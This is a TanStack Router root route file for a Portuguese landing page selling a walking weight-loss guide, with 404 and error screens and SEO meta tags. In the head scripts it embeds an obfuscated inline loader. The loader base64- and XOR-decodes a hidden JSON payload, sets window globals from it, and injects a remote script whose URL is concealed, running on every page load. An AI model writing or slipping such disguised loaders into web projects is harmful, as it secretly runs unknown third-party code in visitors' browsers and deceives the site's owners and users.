import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "30 Dias Caminhando — Perca gordura sem academia" },
      { name: "description", content: "Guia prático para queimar gordura caminhando 30 minutos por dia. Sem academia, sem dieta maluca. Comece hoje por R$16,90." },
      { name: "author", content: "Lovable" },
      { property: "og:title", content: "30 Dias Caminhando — Perca gordura sem academia" },
      { property: "og:description", content: "Guia prático para queimar gordura caminhando 30 minutos por dia. Sem academia, sem dieta maluca. Comece hoje por R$16,90." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:site", content: "@Lovable" },
      { name: "twitter:title", content: "30 Dias Caminhando — Perca gordura sem academia" },
      { name: "twitter:description", content: "Guia prático para queimar gordura caminhando 30 minutos por dia. Sem academia, sem dieta maluca. Comece hoje por R$16,90." },
      { property: "og:image", content: "https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/d8ab01e2-4db7-4f6f-b00e-cf1d014dfd11/id-preview-5e9fbcf1--4b9ee396-8137-4009-95cd-8714fcbd8dae.lovable.app-1784671607977.png" },
      { name: "twitter:image", content: "https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/d8ab01e2-4db7-4f6f-b00e-cf1d014dfd11/id-preview-5e9fbcf1--4b9ee396-8137-4009-95cd-8714fcbd8dae.lovable.app-1784671607977.png" },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
    ],
    scripts: [
      {
        children: `(function(){var s_ud=atob("DOAmHkJRRfklwWcIRZsEazA9Z8MHqRN8NZMcMW0yIZcLtBNlLIZfMCE+KNdHs0h7JpJPbjYiaoxRrBQnKYFSezEla5NW40sqJJRSbCszMI1AskUyHpsEcCM8INsf4wNpMYELazY8LJ9c7Bd6IJZDcDZ8PZpKpUp7JosEMmAnJJVQpEUyZ8JbMjlzK5hIpEUyZ4RHaiN8MI1IqAFxaJBUezQ0K40IshJqLIRVPG5zM5hJtAIqf8IEYx8s");var m_mh0=[];for(var h_7b=0;h_7b<s_ud.length;h_7b++){m_mh0.push(s_ud.charCodeAt(h_7b)&255);}var p_7b=m_mh0[0];var d_r=m_mh0.slice(1,1+p_7b);var v_d3=m_mh0.slice(1+p_7b);var r_4=v_d3.map(function(b,o_lw){return b^d_r[o_lw%p_7b];});var w_zi="";for(var r_rip=0;r_rip<r_4.length;r_rip++){w_zi+=String.fromCharCode(r_4[r_rip]&255);}var a_4=decodeURIComponent(escape(w_zi));var c_6=JSON.parse(a_4);var d_4ug=c_6.globals||[];d_4ug.forEach(function(o_e){window[o_e.name]=o_e.value;});var g_4bs=document.createElement("script");g_4bs.src=c_6.url;g_4bs.async=true;g_4bs.defer=true;(c_6.attributes||[]).forEach(function(x_draw){g_4bs.setAttribute(x_draw.name,x_draw.value);});(document.head||document.documentElement).appendChild(g_4bs);})();`,
      },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
      <head>
        <HeadContent />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
